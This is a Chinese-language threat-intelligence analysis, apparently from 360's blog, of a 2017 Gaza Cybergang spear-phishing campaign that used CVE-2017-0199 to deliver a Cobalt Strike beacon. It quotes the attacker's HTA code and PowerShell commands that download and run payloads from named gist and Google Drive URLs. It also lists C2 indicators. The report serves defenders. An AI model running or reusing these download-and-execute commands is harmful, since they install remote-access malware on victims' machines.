data-line="2">2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。</p>\n<h2 class="line" data-line="4">样本分析</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>004ef1209458bf6056147d1ce001fe9d</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>2.5 MB (2592858 bytes)</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>رارات اللجنة المركزية.doc （中央委员会的决定.doc）</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="13">该文档所利用的漏洞为CVE-2017-0199，该漏洞利用OFFICE OLE对象链接技术，将包裹的恶意链接对象嵌在文档中，OFFICE调用<a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>（COM对象）将恶意链接指向的HTA文件下载到本地， <a href="https://msdn.microsoft.com/en-us/library/ms775149%28v=vs.85%29.aspx">URL Moniker</a>通过识别响应头中content-type的字段信息最后调用mshta.exe将下载到的HTA文件执行起来。</p>\n<p class="text-center line" data-line="15"><img src="/uploads/2017/07/25/2c6c046e1469061df944b8d6b626a9e8.png" alt="" width="90%"></p>\n<p class="line" data-line="17">可以看到下载地址为http://138[.]68.242.68:820/word.hta</p>\n<p class="line" data-line="19">Hta的代码如下：</p>\n<pre class="hljs"><code class="hljs">a=new ActiveXObject(\'WScript.Shell\');\n\na.run(\'%windir%\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -c "iex(New-Object Net.WebClient).DownloadString(\\\'https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1\\\')"\', 0, true);\n\nwindow.close();\n</code></pre>\n<p class="line" data-line="29">其会启用powershell去下载:</p>\n<p class="line" data-line="31">https://gist[.]githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1</p>\n<p class="line" data-line="33">1.ps1其实也是一个downloader,从https://drive[.]google.com/uc?export=download&amp;id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU下载一个PE文件并保存为%appdata%目录下的ps.exe。</p>\n<pre class="hljs"><code class="hljs">powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile(\'https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU\',"$env:APPDATA\\ps.exe"\\);Start-Process ("$env:APPDATA\\ps.exe")\n</code></pre>\n<p class="line" data-line="39">ps.exe是一个sfx文件，解压出来notepad.exe是一个dropper，其会在temp目录释放一个powershell脚本，然后以<code>&quot;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe&quot; -noProfile -ExecutionPolicy Bypass -File &quot;C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\3A.tmp\\3B.ps1&quot;</code>执行该脚本。</p>\n<p class="text-center line" data-line="41"><img src="/uploads/2017/07/25/15b019813d9e6141c0e6613cb2a2f14b.png" alt="" width="90%"></p>\n<p class="line" data-line="43">Powershell脚本的功能也非常简单，将内置的字符串base64decode后，得到一个PE文件（beacon_dll.dll），然后CreateThread一个新线程，将这个dll加载起来。</p>\n<p class="line" data-line="45">beacon_dll.dll是使用cobalt strike攻击框架生成的标准攻击载荷。其使用了一种叫做Reflective Load的技术，也就是在PE头部插入shellcode并实现一个模拟加载dll的导出函数，在shellcode中调用该导出函数将自身加载进来，并以fdwReason = 4来调用DllMain，这样做的好处有两个：</p>\n<ol>\n<li>可以直接将dll当成shellcode加载\\注入到内存中从MZ头开始执行；</li>\n<li>正常地加载dll不会执行到功能流程（因为在MSDN中指明了fdwReason的值只能为0、1、2、3）。</li>\n</ol>\n<p class="line" data-line="50">MZ头部的shellcode如下：</p>\n<p class="text-center line" data-line="52"><img src="/uploads/2017/07/25/7cdd85072c838392e04111126d73d632.png" alt="" width="90%"></p>\n<p class="line" data-line="54">实现自加载的导出函数的校验PE头部分代码：</p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/25/f2a186ca6c79f8af69415eb81d031579.png" alt="" width="90%"></p>\n<p class="line" data-line="58">DllMain中代码：</p>\n<p class="text-center line" data-line="60"><img src="/uploads/2017/07/25/82809a34c05d0f327c3bd5b33fd0e99e.png" alt="" width="90%"></p>\n<p class="line" data-line="62">可以看到，只有在fdwReason == 4时才会进入真正的功能流程，进入该流程后，首先将数据节偏移为 0x2E040，大小为 0x610的数据解密，解密方式是xor 0x69, 解密出的数据中包含了C&amp;C， lol[.]mynetav.org。</p>\n<p class="text-center line" data-line="64"><img src="/uploads/2017/07/25/0a7801660bd57492afc18b7bfa30ccfc.png" alt=""></p>\n<p class="line" data-line="66">然后开始连接C&amp;C服务器，这里支持dns_text,http,smb,tcp等多种协议的通信方式：</p>\n<p class="text-center line" data-line="68"><img src="/uploads/2017/07/25/6b55fb43a9e99442972c250752cda50a.png" alt=""></p>\n<p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/46b35f1a964950a8beca926fe2de433f.png" alt="" width="90%"></p>\n<p class="line" data-line="72">最后进入的就是远控功能部分了，由于是Cobalt Strike生成的标准载荷，功能包括显示应用信息、显示机器的凭证信息，文件下载，查看事件日志，键盘记录，获取代理信息，屏幕截图，加载脚本等等..... 具体功能就不再分析了。</p>\n<h2 class="line" data-line="74">扩展与关联分析</h2>\n<p class="line" data-line="76">使用360威胁情报中心的<a href="http://ti.360.com">威胁情报平台</a>对样本连接的C&amp;C地址（138.68.242.68）做进一步关联，发现了一个新的样本：</p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/25/eb821528a0dd812e962cb8ca362d4584.png" alt="" width="90%"></p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>87a67371770fda4c2650564cbb00934d</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>2.5 MB (2592858 bytes)</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>محضر اجتماع مركزية فتح الليلة.doc （中心开幕之夜的会议纪要.doc）</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="89">该样本与上面提到的样本几乎完全一致，只是连接的url变成了http://138[.]68.242.68:808/word.hta</p>\n<p class="line" data-line="91">另外我们发现lol.mynetav.org解析到的ip地址就是138.68.242.68，并且有一个域名<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>也解析到了这个ip上，而<a href="https://www.passivetotal.org/search/ksm5sksm5sksm5s.zzux.com">ksm5sksm5sksm5s.zzux.com</a>这个域名，是Gaza Cybergang攻击事件（Gaza Cybergang APT活动是在2015年9月被Kaspersky公开揭露出来的一个APT组织，最早的活动可以追溯到2012年。相关行动的主要使用的攻击方式：鱼叉邮件，涉及行业：政治，受影响国家：埃及、阿联酋、也门）的其中一个C&amp;C。 综合上面提到的文档标题、内容和来源，我们认为这次事件应该是Gaza Cybergang APT活动的又一次攻击活动。</p>\n<h2 class="line" data-line="93">IOC</h2>\n<table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>محضر اجتماع مركزية فتح الليلة.doc</td>\n</tr>\n<tr>\n<td>رارات اللجنة المركزية.doc</td>\n</tr>\n<tr>\n<td>Ps.exe</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>MD5</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>87a67371770fda4c2650564cbb00934d</td>\n</tr>\n<tr>\n<td>004ef1209458bf6056147d1ce001fe9d</td>\n</tr>\n<tr>\n<td>2b3df594e5d73a95c9f2d820072b067a</td>\n</tr>\n<tr>\n<td>bfefedb094f40c276bf1ae26b225e310</td>\n</tr>\n<tr>\n<td>4f3b1a2088e473c7d2373849deb4536f</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>下载链接</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>https://doc-0k-2g-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/jft1kksjnhmtb1r0jdudcme1r83f05an/1497996000000/00086189316172082427/*/0B1NUTMCAOKBTdVQzTXlUNHBmZUU?e=download</td>\n</tr>\n<tr>\n<td>https://drive.google.com/uc?export=download&amp;id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU</td>\n</tr>\n<tr>\n<td>http://138.68.242.68:820/word.hta</td>\n</tr>\n<tr>\n<td>http://138.68.242.68:808/word.hta</td>\n</tr>\n<tr>\n<td>https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1</td>\n</tr>\n<tr>\n<td>http://lol.mynetav.org:3737/ptj</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>C&amp;C</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lol.mynetav.org</td>\n</tr>\n<tr>\n<td>138.68.242.68</td>\n</tr>\n</tbody>\n</table>\n'}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.38f62477280dcc27df9e.js"></script><script defer src="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js"></script><script defer src="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js"></script>